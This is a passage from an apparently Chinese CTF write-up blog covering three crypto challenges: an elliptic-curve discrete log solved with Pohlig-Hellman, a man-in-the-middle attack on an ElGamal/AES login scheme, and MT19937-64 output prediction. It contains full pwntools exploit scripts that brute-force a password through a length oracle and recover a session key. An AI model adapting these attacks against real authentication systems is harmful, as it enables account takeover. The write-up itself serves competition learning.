ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 其使用了一个随机生成参数的MyCurve并生成了随机的e，给我们三次交互的机会，每次交互会随机生成点G和点P并使用OT将这两个点的信息传递给我们，点P是e倍的点G，当我们给服务器正确的e的时候我们可以得到flag\n这其实就是一个离散对数问题，我们首先关注服务器的参数，MyCurve所使用的p是512比特的，而OT中RSA的n是2048比特的，这样生成的点的x和y乘起来也没有n的大。那么可以参考2020hackergame的\r不经意传输中的攻击方式来同时获取点的x和y坐标\n之后便是如何通过点G和点P来获取e了，我们可以注意到p-1是光滑的\nsage: factor(p-1) 2^21 * 3^10 * 7^4 * 11 * 13^2 * 17 * 19 * 29 * 31 * 37 * 43^3 * 47 * 71 * 83 * 89 * 97 * 223 * 293 * 587 * 631 * 709 * 761 * 1327 * 1433 * 1733 * 1889 * 2503 * 3121 * 6043 * 6301 * 49523 * 98429 * 140683 * 205589 * 1277369 * 1635649 * 5062909 * 45698189 * 67111151 * 226584089 * 342469397 那么我们可以通过\rPohlig-Hellman algorithm来解决离散对数问题并最终得到flag\nEXP # exp有概率成功，如果报错或者答案错误多跑几次即可\n#!/usr/bin/env python import string, gmpy2 from hashlib import sha256 from pwn import * context.log_level = \u0026#34;debug\u0026#34; dic = string.ascii_letters + string.digits def solvePow(prefix,h): for a1 in dic: for a2 in dic: for a3 in dic: for a4 in dic: x = a1 + a2 + a3 + a4 proof = x + prefix.decode(\u0026#34;utf-8\u0026#34;) _hexdigest = sha256(proof.encode()).hexdigest() if _hexdigest == h.decode(\u0026#34;utf-8\u0026#34;): return x def getData(): r.recvuntil(\u0026#34;n = \u0026#34;) n = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;e = \u0026#34;) e = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;x0 = \u0026#34;) x0 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;x1 = \u0026#34;) x1 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) offset = 2 \u0026lt;\u0026lt; 1024 offset_e = int(pow(offset, e, n)) v = ((offset_e * x0 - x1) * gmpy2.invert(offset_e - 1, n)) % n r.sendlineafter(\u0026#34;v = \u0026#34;,str(v)) r.recvuntil(\u0026#34;m0_ = \u0026#34;) m0 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) r.recvuntil(\u0026#34;m1_ = \u0026#34;) m1 = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) m = (m0 * offset - m1) % n x = m // offset + 1 y = x * offset - m return x,y r = remote(\u0026#34;47.100.50.252\u0026#34;,10000) r.recvuntil(\u0026#34;sha256(XXXX+\u0026#34;) prefix = r.recvuntil(\u0026#34;) == \u0026#34;, drop = True) h = r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True) result = solvePow(prefix,h) r.sendlineafter(\u0026#34;Give me XXXX: \\n\u0026#34;,result) r.recvuntil(\u0026#34;p = \u0026#34;) r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True) r.recvuntil(\u0026#34;D = \u0026#34;) D = int(r.recvuntil(\u0026#34;\\n\u0026#34;, drop = True)) Gx,Gy = getData() Px,Py = getData() with open(\u0026#34;data.txt\u0026#34;,\u0026#34;wb\u0026#34;) as f: f.write(str(D).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Gx).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Gy).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Px).encode() + b\u0026#34;\\n\u0026#34;) f.write(str(Py).encode() + b\u0026#34;\\n\u0026#34;) s = process(argv=[\u0026#34;sage\u0026#34;, \u0026#34;exp.sage\u0026#34;]) e = int(s.recv()) s.close() r.sendline(str(e)) r.interactive() # exp.sage load(\u0026#34;Curve.sage\u0026#34;) p = 9688074905643914060390149833064012354277254244638141162997888145741631958242340092013958501673928921327767591959476890238698855704376126231923819603296257 F = GF(p) fac = [2^21,3^10,7^4,11,13^2,17,19,29,31,37,43^3,47,71,83,89,97,223,293,587,631,709,761,1327,1433,1733,1889,2503,3121,6043,6301,49523,98429,140683,205589,1277369,1635649,5062909,45698189,67111151,226584089,342469397] def bsgs(g, y, p): m = int(ceil(sqrt(p - 1))) S = {} point = (u,0) for i in range(m): point = curve.add(point,g) pointg = point[0] \u0026lt;\u0026lt; 800 | point[1] S[pointg] = i gs = curve.mul(m,g) for i in range(m): pointy = y[0] \u0026lt;\u0026lt; 800 | y[1] if pointy in S: return S[pointy] - i * m + 1 y = curve.add(y,gs) return None def Pohlig_Hellman(G,P): ea = [] na = [] for i in range(len(fac)): c = fac[i] n = (p - 1) // c gi = curve.mul(n, G) yi = curve.mul(n, P) ei = bsgs(gi,yi,c) ea.append(ei%c) na.append(c) ee = crt(ea,na) return ee data = open(\u0026#34;data.txt\u0026#34;,\u0026#34;rb\u0026#34;).read().decode(\u0026#34;utf-8\u0026#34;) data = data.split(\u0026#34;\\n\u0026#34;) D = int(data[0]) Gx = int(data[1]) Gy = int(data[2]) Px = int(data[3]) Py = int(data[4]) G = (F(Gx),F(Gy)) P = (F(Px),F(Py)) u2 = (Gx ^ 2 - D * Gy ^ 2) u2 = F(u2) u = int(u2.sqrt()) curve = MyCurve(p , D , u) e = Pohlig_Hellman(G,P) e %= p - 1 print(e) AliceWantFlag # 题目分析 # 这道题目分为server端和Alice端，其中server端的代码如下\nfrom elgamal import elgamal import socketserver from prikey import server_prikey , AlicePasswd from pubkey import Alice_pubkey from secret import Alice_flag , ctfer_flag import random import signal from os import urandom from Crypto.Util.number import long_to_bytes , bytes_to_long from Crypto.Cipher import AES MENU = \u0026#34;1. signup 2.signin\u0026#34; XOR = lambda s1,s2 :bytes([x1^x2 for x1 , x2 in zip(s1,s2)]) def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): padlen = m[-1] for i in range(1 , padlen + 1): if m[-i] != m[-1]: return b\u0026#39;\u0026#39; return m[:-m[-1]] class server(socketserver.BaseRequestHandler): def setup(self): self.pubkey = {} self.passwd = {} self.prikey = elgamal(server_prikey) self.pubkey[b\u0026#39;Alice\u0026#39;] = elgamal(Alice_pubkey) self.passwd[b\u0026#39;Alice\u0026#39;] = AlicePasswd def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def enc_send(self, msg , usrid , enc_key = b\u0026#39;\u0026#39;): if enc_key == b\u0026#39;\u0026#39;: pubenc = self.pubkey[usrid] y1 , y2 = pubenc.encrypt(bytes_to_long(msg)) self._send(str(y1) + \u0026#39;, \u0026#39; + str(y2)) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) self._send(aes.encrypt(pad(msg))) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.prikey.decrypt(c) print(long_to_bytes(m)) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) def signup(self): if len(self.passwd) \u0026gt; 5: self._send(\u0026#39;sorry, the number of users is out of limit\u0026#39;) return 0 self._send(\u0026#39;please give me your name\u0026#39;) userid = self._recv() if len(userid) \u0026gt; 20: self._send(\u0026#39;your id can\\\u0026#39;t be too long\u0026#39;) return 0 elif userid in self.passwd: self._send(\u0026#39;the name has been used\u0026#39;) return 0 else: self._send(\u0026#39;please give me your passwd(encrypted)\u0026#39;) userpasswd = self.dec_recv() if len(userpasswd) \u0026gt; 11: self._send(\u0026#39;your password can\\\u0026#39;t be too long\u0026#39;) return 0 else: self.passwd[userid] = userpasswd self._send(\u0026#39;please give me your publickey\u0026#39;) userpubkey = self._recv() try: userpubkey = [int(i) for i in userpubkey[1:-1].split(\u0026#39;, \u0026#39;)] except: self._send(\u0026#39;publickey format error\u0026#39;) self.passwd.pop(userid) return 0 self.pubkey[userid] = elgamal(userpubkey) self._send(\u0026#39;sign up success\u0026#39;) return 1 def signin(self): self._send(\u0026#39;please give me your name\u0026#39;) userid = self._recv() if userid not in self.passwd: self._send(\u0026#39;sorry the userid is not existed\u0026#39;) return 0 while 1: random.seed(urandom(8)) r = random.getrandbits(8 * 11) self._send(\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) self._send(str(r)) userdata = self.dec_recv() if bytes_to_long(userdata) == r ^ bytes_to_long(self.passwd[userid]): self._send(\u0026#39;signin success\u0026#39;) break else: self._send(\u0026#39;password error\u0026#39;) endkey = urandom(5) key = userdata + endkey self._send(\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) self.enc_send(endkey , userid) return userid , key def handle(self): signal.alarm(240) key = b\u0026#39;\u0026#39; userid = \u0026#39;\u0026#39; while 1: self._send(MENU) choice = self._recv() if choice == b\u0026#39;1\u0026#39;: self.signup() elif choice == b\u0026#39;2\u0026#39;: temp = self.signin() if temp != 0: userid , key = temp break else: self._send(\u0026#39;error\u0026#39;) msg = self.dec_recv(enc_key = key) if msg == b\u0026#39;I am a ctfer.Please give me flag\u0026#39;: self.enc_send(b\u0026#39;ok, your flag is here \u0026#39; + ctfer_flag , userid , enc_key= key) elif msg == b\u0026#39;I am Alice, Please give me true flag\u0026#39; and userid == b\u0026#39;Alice\u0026#39;: self.enc_send(b\u0026#39;Hi Alice, your flag is \u0026#39; + Alice_flag , userid , enc_key= key) return 0 def finish(self): self.request.close() class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() Alice端的代码如下\nimport socket from elgamal import elgamal from pubkey import server_pubkey from prikey import Alice_prikey , AlicePasswd from Crypto.Util.number import long_to_bytes , bytes_to_long from Crypto.Cipher import AES import socketserver , signal def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): return m[:-m[-1]] class Alice: def __init__(self , ip , port): self.pridec = elgamal(Alice_prikey) self.pubenc = elgamal(server_pubkey) self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.s.connect((ip, port)) def _recv(self): data = self.s.recv(1024) return data.strip() def _send(self, msg): if isinstance(msg , str): msg = msg.encode() self.s.send(msg) def enc_send(self, msg , enc_key = b\u0026#39;\u0026#39;): if enc_key == b\u0026#39;\u0026#39;: y1 , y2 = self.pubenc.encrypt(bytes_to_long(msg)) self._send(str(y1) + \u0026#39;, \u0026#39; + str(y2)) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) self._send(aes.encrypt(pad(msg))) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.pridec.decrypt(c) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) def main(self): firstmsg = self._recv() if firstmsg != b\u0026#39;1. signup 2.signin\u0026#39;: return 0 self._send(\u0026#39;2\u0026#39;) self._recv() self._send(\u0026#39;Alice\u0026#39;) self._recv() r = int(self._recv()) userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r) self.enc_send(userdata) self._recv() self._recv() endkey = self.dec_recv() key = userdata + endkey self.enc_send(b\u0026#39;I am a ctfer.Please give me flag\u0026#39; , enc_key = key) return self.dec_recv(enc_key = key) class Task(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b\u0026#39;\\n\u0026#39; else: msg += \u0026#39;\\n\u0026#39; msg = msg.encode() self.request.sendall(msg) def handle(self): signal.alarm(60) self._send(\u0026#39;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\u0026#39;) try: addr = self._recv() ip, port = [x.strip() for x in addr.split(b\u0026#39;:\u0026#39;)] port = int(port) except: ip, port = \u0026#39;0.0.0.0\u0026#39;, 10001 a = Alice(ip , port) msg = a.main() self._send(b\u0026#39;Thanks, here is your flag\u0026#39;) self._send(msg) class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10003 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() server和Alice的密钥生成和使用都和elgamal算法一致，这里不再阐述\n服务端的大概逻辑如下\nU: User S: Server UserPasswd = UserPublicKey Sign Up: S -\u0026gt; U : \u0026#39;please give me your name\u0026#39; U -\u0026gt; S : userid S : assert len(userid) \u0026lt;= 20 and userid not in passwd S -\u0026gt; U : \u0026#39;please give me your passwd(encrypted)\u0026#39; U -\u0026gt; S : c = elgamal.enc(UserPasswd,ServerPublicKey) S : userpasswd = elgamal.dec(c,ServerPrivateKey S : assert len(userpasswd) \u0026lt;= 11 S : passwd[userid] = userpasswd S -\u0026gt; U : \u0026#39;sign up success\u0026#39; Sign In: S -\u0026gt; U : \u0026#39;please give me your name\u0026#39; U -\u0026gt; S : userid S : assert userid in passwd S -\u0026gt; U : \u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39; S -\u0026gt; U : r = random.getrandbits(8 * 11) U -\u0026gt; S : c = elgamal.enc(UserPasswd ^ r,ServerPublicKey) S : assert elgamal.dec(c,ServerPrivateKey) == passwd[userid] ^ r S : key = userdata + endkey, userdata = passwd[userid] ^ r, endkey = urandom(5) S -\u0026gt; U : \u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39; S -\u0026gt; U : k = elgamal.enc(key,UserPasswd) U -\u0026gt; S : m = AES.enc(key,msg) S : dm = AES.dec(key,m) S : if dm == \u0026#39;I am a ctfer.Please give me flag\u0026#39;: S -\u0026gt; U : r1 = AES.enc(key,ctfer_flag) S : if dm == \u0026#39;I am Alice, Please give me true flag\u0026#39; and userid == \u0026#39;Alice\u0026#39; S -\u0026gt; U : r2 = AES.enc(key,Alice_flag) 大概理解下来就是一个利用elgamal进行密钥交换然后加密通信的逻辑\n由于这里我们需要以Alice的身份登陆并使用交换的AES通信密钥进行密文的加密，所以我们需要知道AlicePasswd和key\n这道题目中由于也有Alice端的服务，所以我们可以伪装成服务端来和Alice端进行通信，也就是进行中间人攻击\n首先来看看如何获得AlicePasswd，观察Alice端的如下代码\ndef main(self): firstmsg = self._recv() if firstmsg != b\u0026#39;1. signup 2.signin\u0026#39;: return 0 self._send(\u0026#39;2\u0026#39;) self._recv() self._send(\u0026#39;Alice\u0026#39;) self._recv() r = int(self._recv()) userdata = long_to_bytes(bytes_to_long(AlicePasswd) ^ r) self.enc_send(userdata) self._recv() self._recv() endkey = self.dec_recv() key = userdata + endkey self.enc_send(b\u0026#39;I am a ctfer.Please give me flag\u0026#39; , enc_key = key) return self.dec_recv(enc_key = key) def dec_recv(self, enc_key = b\u0026#39;\u0026#39;): msg = self._recv() if enc_key == b\u0026#39;\u0026#39;: c = [int(i) for i in msg.split(b\u0026#39;, \u0026#39;)] m = self.pridec.decrypt(c) return long_to_bytes(m) else: assert len(enc_key) == 16 aes = AES.new(enc_key , AES.MODE_ECB) return unpad(aes.decrypt(msg)) 由于endkey长度为5，而key的长度是16，那么可以自然推断出userdata的长度为11\n但是如果我们控制r使得userdata的第一个字节异或为了\\x00，那么userdata的长度就变成了10，如果endkey的长度不变，再使用userdata + endkey作为AES的key，那么会通不过assert len(enc_key) == 16，即连接会断开\n这样我们可以通过单字节爆破AlicePasswd的值使得key的长度从16变成15，这样就能获得AlicePasswd的第一个字节，然后重复该过程便可以获得AlicePasswd（每爆破出一个字节，在爆破下一个字节的时候将endkey的长度变长一位即可连续爆破）\nPS：实际上的操作过程中AlicePasswd的最后一个字节爆破不出来，我们使用服务端的Sign In功能来爆破最后一个字节即可\n在拿到了AlicePasswd之后，我们便可以伪造成Alice登陆服务端，但是由于endkey是使用AlicePublicKey来进行加密的，所以我们还需要拿到endkey的值才能获得AES的key并进行任意文本加解密\n前面我们提过，endkey长度为5，但是实际上elgamal的p是512比特的，也就是说endkey远比p小\n如果我们将elgamal加密后的endkey的y2乘以一个倍数k，那么elgamal解密后的endkey就会变大k倍，这个值如果特别大，则userdata + endkey就也会变大，这样便会通不过assert len(enc_key) == 16，即连接会断开\n那么我们就可以通过遍历k并查看连接是否断开来得到endkey的大致范围，然后通过控制r让userdata的长度变小来使得我们的k可以不断变大，进而将endkey的取值范围不断缩小来得到endkey\n最后我们便可以进行任意文本加解密来获取flag\nEXP # 爆破AlicePasswd的脚本（除了最后一个字节）\n#!/usr/bin/env python from elgamal import elgamal from os import urandom from Crypto.Util.number import * from pwn import * from time import * import random #context.log_level = \u0026#39;debug\u0026#39; Alice_pubkey = (10701440058624032601015137538928332495339102166449611910023158626004456760436930147541475696463030881833656888220652983522600176918743749340172660134163173, 1564399668655593150166497641453625075939863931648697579307, 7485644640971189066076867813504769638089749022750276585841131549227880841063823940682209946365975810625990180843110530957715179877761206203179636693608929, 10399272689500457356753299445284422908920074489727610618928888372268024186959263604721857776550008093778901180936272708522371781846820901338928077050396521) pubenc = elgamal(Alice_pubkey) def enc(msg): y1 , y2 = pubenc.encrypt(bytes_to_long(msg)) return [y1,y2] def attackAlice(rr,m): try: middle_shell = listen(8888) alice_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10003) alice_shell.recvuntil(b\u0026#34;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\\n\u0026#34;) alice_shell.sendline(\u0026#34;xxxx:8888\u0026#34;) # xxxx -\u0026gt; your vps\u0026#39;s ip middle_shell.sendline(b\u0026#39;1. signup 2.signin\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your name\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) middle_shell.sendline(str(rr)) middle_shell.recv() middle_shell.sendline(b\u0026#39;signin success\u0026#39;) middle_shell.sendline(b\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) middle_shell.sendline(str(m[0]) + \u0026#39;, \u0026#39; + str(m[1])) sleep(0.3) result = middle_shell.recv() if result != b\u0026#34;\u0026#34;: middle_shell.close() alice_shell.close() return True except: if middle_shell: middle_shell.close() if alice_shell: alice_shell.close() return False known_pwd = b\u0026#34;\u0026#34; # 0x35343764643163636333xx for i in range(11): for r in range(0,256): rr = ((bytes_to_long(known_pwd) \u0026lt;\u0026lt; 8) + r) \u0026lt;\u0026lt; ((11 - i - 1) * 8) print(\u0026#34;try:\u0026#34; + hex(rr)) msg = b\u0026#34;A\u0026#34; * (5 + i) c = enc(msg) if not attackAlice(rr,c): known_pwd += long_to_bytes(r) print(known_pwd.hex()) break 爆破AlicePasswd的最后一个字节的脚本\n#!/usr/bin/env python from elgamal import elgamal from os import urandom from Crypto.Util.number import * from pwn import * from time import * import random #context.log_level = \u0026#39;debug\u0026#39; dic = \u0026#34;0123456789abced\u0026#34; server_pubkey = (8299337325013713958100496214277076548352330213422739951900206795659160881192662528217175848727001874097369338994314737585158671248737646741717255122339339, 1168114014665994438995759247944846107956060291607878556427, 6500863983405565947154848535503122330952083500341721347265599161478330537510643776384164499549064061675517930495094496645911948535824156417648599603482256, 1567838365897620258270310904624368598290758028096181970817619626094906443214320401208038763050717813632540079799097716376430981907783174222429828480377116) pubenc = elgamal(server_pubkey) known_pwd = \u0026#34;547dd1ccc3\u0026#34; server_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10001) server_shell.sendlineafter(\u0026#34;\\n\u0026#34;,\u0026#34;2\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your name\\n\u0026#34;) server_shell.sendline(\u0026#34;Alice\u0026#34;) for c in dic: server_shell.recvuntil(\u0026#34;please give me your passwd(encrypted and xored by r)\\n\u0026#34;) rr = int(server_shell.recvline()) pwd = bytes_to_long((known_pwd + c).encode()) prefix = long_to_bytes(pwd ^ rr) assert(len(prefix) == 11) y1 , y2 = pubenc.encrypt(pwd ^ rr) server_shell.sendline(str(y1) + \u0026#39;, \u0026#39; + str(y2)) result = server_shell.recv() if b\u0026#34;success\u0026#34; in result: print(known_pwd + c) break server_shell.interactive() 获取endkey并进行中间人攻击的脚本\n#!/usr/bin/env python from pwn import * from Crypto.Util.number import * from Crypto.Cipher import AES from elgamal import elgamal #context.log_level = \u0026#34;debug\u0026#34; pwd = \u0026#34;547dd1ccc38\u0026#34;.encode() pwd = bytes_to_long(pwd) server_pubkey = (8299337325013713958100496214277076548352330213422739951900206795659160881192662528217175848727001874097369338994314737585158671248737646741717255122339339, 1168114014665994438995759247944846107956060291607878556427, 6500863983405565947154848535503122330952083500341721347265599161478330537510643776384164499549064061675517930495094496645911948535824156417648599603482256, 1567838365897620258270310904624368598290758028096181970817619626094906443214320401208038763050717813632540079799097716376430981907783174222429828480377116) pubenc = elgamal(server_pubkey) p = 10701440058624032601015137538928332495339102166449611910023158626004456760436930147541475696463030881833656888220652983522600176918743749340172660134163173 def pad(m): m += bytes([16 - len(m) % 16] * (16 - len(m) % 16)) return m def unpad(m): padlen = m[-1] for i in range(1 , padlen + 1): if m[-i] != m[-1]: return b\u0026#39;\u0026#39; return m[:-m[-1]] def oracle(m,n,p): y1 = m[0] y2 = m[1] y2 = (y2 * n) % p return [y1,y2] def combineKey(m,rr): for i in range(3): sleep(0.3) try: middle_shell = listen(8888) alice_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10003) alice_shell.recvuntil(b\u0026#34;Hello, I am Alice, can you tell me the address of the server?\\nIn return, I will give you the ctf_flag\\n\u0026#34;) alice_shell.sendline(\u0026#34;xxxx:8888\u0026#34;) # xxxx -\u0026gt; your vps\u0026#39;s ip middle_shell.sendline(b\u0026#39;1. signup 2.signin\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your name\u0026#39;) middle_shell.recv() middle_shell.sendline(b\u0026#39;please give me your passwd(encrypted and xored by r)\u0026#39;) middle_shell.sendline(str(rr)) middle_shell.recv() middle_shell.sendline(b\u0026#39;signin success\u0026#39;) middle_shell.sendline(b\u0026#39;now let\\\u0026#39;s communicate with this key\u0026#39;) middle_shell.sendline(str(m[0]) + \u0026#39;, \u0026#39; + str(m[1])) sleep(0.5) result = middle_shell.recv() print(result) if result != b\u0026#34;\u0026#34;: middle_shell.close() alice_shell.close() return True except: if middle_shell: middle_shell.close() if alice_shell: alice_shell.close() return False server_shell = remote(\u0026#34;47.100.0.15\u0026#34;,10001) server_shell.sendlineafter(\u0026#34;\\n\u0026#34;,\u0026#34;2\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your name\\n\u0026#34;) server_shell.sendline(\u0026#34;Alice\u0026#34;) server_shell.recvuntil(\u0026#34;please give me your passwd(encrypted and xored by r)\\n\u0026#34;) rr = int(server_shell.recvline()) prefix = long_to_bytes(pwd ^ rr) assert(len(prefix) == 11) y1 , y2 = pubenc.encrypt(pwd ^ rr) server_shell.sendline(str(y1) + \u0026#39;, \u0026#39; + str(y2)) server_shell.recvuntil(\u0026#34;now let\u0026#39;s communicate with this key\\n\u0026#34;) y1,y2 = [int(i) for i in server_shell.recvuntil(\u0026#34;\\n\u0026#34;, drop = True).decode(\u0026#34;utf-8\u0026#34;).split(\u0026#34;, \u0026#34;)] print(y1,y2) success(\u0026#34;Get communicate key:\u0026#34; + str(y1) + \u0026#34;,\u0026#34; + str(y2)) l = 0 h = 2**40 idx = 0 prefix_length = 0 bound = 2**40 count = 0 flag = False for _ in range(11): if flag: break binary_ptr = 0x80 diff = binary_ptr // 2 assert_arr = [-1] * 256 for i in range(10): count += 1 if binary_ptr != 0 and assert_arr[binary_ptr-1] ^ assert_arr[binary_ptr] == 1: prefix_length += 1 l = bound // multiple h = bound // (multiple - 1) idx = multiple - 1 print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: flag = True break if binary_ptr != 255 and assert_arr[binary_ptr] ^ assert_arr[binary_ptr+1] == 1: prefix_length += 1 l = bound // (multiple + 1) h = bound // multiple idx = multiple print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: flag = True break rr = bytes_to_long(long_to_bytes(pwd)[:prefix_length]) * 2**(8*(11 - prefix_length)) multiple = idx * 0x100 + binary_ptr m = oracle([y1,y2],multiple,p) if combineKey(m,rr): if binary_ptr == 255: prefix_length += 1 h = bound // (multiple + 1) idx = multiple + 1 print(hex(l),hex(h),count) bound *= 0x100 if abs(h - l) \u0026lt; 2: exit(0) break assert_arr[binary_ptr] = 0 binary_ptr += diff diff //= 2 else: assert_arr[binary_ptr] = 1 binary_ptr -= diff diff //= 2 context.log_level = \u0026#34;debug\u0026#34; endkey = long_to_bytes(h) key = prefix + endkey success(\u0026#34;get key:\u0026#34; + key.hex()) data = b\u0026#39;I am Alice, Please give me true flag\u0026#39; cipher = AES.new(key , AES.MODE_ECB) data = cipher.encrypt(pad(data)) server_shell.sendline(data) msg = server_shell.recvuntil(\u0026#34;\\n\u0026#34;,drop = True) print(cipher.decrypt(msg)) 参考 # https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/不经意传输/README.md\nhttps://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm\n莲城杯 经典随机数Yusa的密码学课堂——MT19937 # 又是这个系列的题\n有三个文件都已经上传至\rgithub仓库里了\n虽然考点还是MT19937伪随机数，但是这个是在C++下写的；之前发过关于这类题的文章，但今天去看写地太烂了，处刑一下，完全没有搞懂嘛\nhttps://4xwi11.github.io/posts/2d82e8aa/\n解决上次的一个问题\n并非不是需要624个数，而是需要凑足32*624位，也就是64*312位\n所以如果是纯python的话，这道题应该秒出，但问题是C++；试了下就算给相同的种子，但生成的随机数序列也是不同的，算法略有出路应该\n代码不长，贴一下\nimport subprocess\rimport os\rimport random\rimport hashlib\rsubprocess.run([\u0026#34;g++\u0026#34;, \u0026#34;random.cpp\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;random\u0026#34;, \u0026#34;-std=c++11\u0026#34;],check=True)\rproc = subprocess.Popen([\u0026#34;./random\u0026#34;],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\r# out, err = proc.communicate(str(int(os.urandom(8).hex(),16)).encode() + b\u0026#34;\\n\u0026#34;)\rout, err = proc.communicate(str(16063322316592949072).encode() + b\u0026#34;\\n\u0026#34;)\rdata = out.strip().split()\rflag = random.randint(0,len(data))\rFLAG = b\u0026#39;DASCTF{\u0026#39;+hashlib.md5(data.pop(flag)).hexdigest().encode()+b\u0026#39;}\u0026#39;\rdata = list(map(int,data))\rwith open(\u0026#34;outputs_%d.txt\u0026#34;%flag,\u0026#34;w\u0026#34;) as f:\rf.write(str(data))\r#include \u0026lt;cinttypes\u0026gt;\r#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;random\u0026gt;\rint main() {\ruint64_t seed;\rstd::cin \u0026gt;\u0026gt; seed;\rstd::mt19937_64 rng(seed);\rfor (int i = 0; i \u0026lt; 1000; ++i) {\rstd::cout \u0026lt;\u0026lt; rng() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;;\r}\rreturn 0;\r} 好了，开始讲这道题的思路\n这张图出来的有点早（doge）\n先看到最后，这个flag在文件名中，就是pop出来的伪随机数，是374\nwith open(\u0026#34;outputs_%d.txt\u0026#34;%flag,\u0026#34;w\u0026#34;) as f:\rf.write(str(data)) 但可惜根据pop，虽然我们知道data，但是是删除了原第374位的data\n需要通过其余373+625个数字求得这位\n显然根据之前的mt19937predictor，和前373位（这个上面刚解释过）以及后面的625位，是完全可以获得的，然后再得到第374个，拿捏\n可是试过了不行，用了恢复的方法也不行；然后就想是不是C++的问题\n所以接下来的搜索思路就如上图所示，搜索关键词c++和mt19937以及predict，当然一般都返回32位的结果，所以加上64；原题到手\n改下jo本就有\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom mt19937_64 import mt19937_64\rimport hashlib\rres = [15224110489171130169, 1487925206988459477, 13480727356180709371, 9868256411224235526, 6217804851957837168, 16087170136679200450, 10701512125563075829, 13839719157982856576, 17686330611486610733, 8009416170371519873, 5970669226517080452, 11269217943220347675, 10679128876184101302, 18426494309927575430, 2766502893811979226, 2252796059596895410, 9426444128738501522, 11240845202238046967, 10773508588111955623, 1557877671900503598, 10687052904024584487, 1329391365184628727, 7924797549450027243, 8535390433774276870, 3764662861183967374, 2246153524896469598, 2609915142724872757, 10658867097171399935, 5527882090828515536, 16980061916688614551, 369781677154768879, 16440083865102214341, 6215352314823709568, 7140216739817729337, 12081906179615786779, 6478685619216942062, 9619055260791569210, 1716773987678792695, 5781591055396867866, 10236249441362668669, 4314491602044042424, 9076763991771914801, 1019089589927696539, 12783145303781447438, 1784730974216681496, 10724359773647505800, 9412346711065789784, 12397469196070741661, 844871001521064632, 13554026965219580112, 4176961812003667679, 6038315983316303141, 3991176913179867636, 7277063843827680934, 6593392965255927508, 7279379575539700793, 7049180319367268844, 2484858153711481256, 9662542622219218463, 15645318283754749515, 7848634356524747132, 6328770785215004957, 14031726511284712999, 10754197358715401067, 14877197602427408826, 1961981170873480756, 15043831614315156076, 2703733192099380300, 5573267746680488476, 2588678833804270160, 16641900531805836732, 14485077651674686804, 17908682116840210486, 12129346423391778925, 449323128784312129, 2912052724053440605, 3725415122737515057, 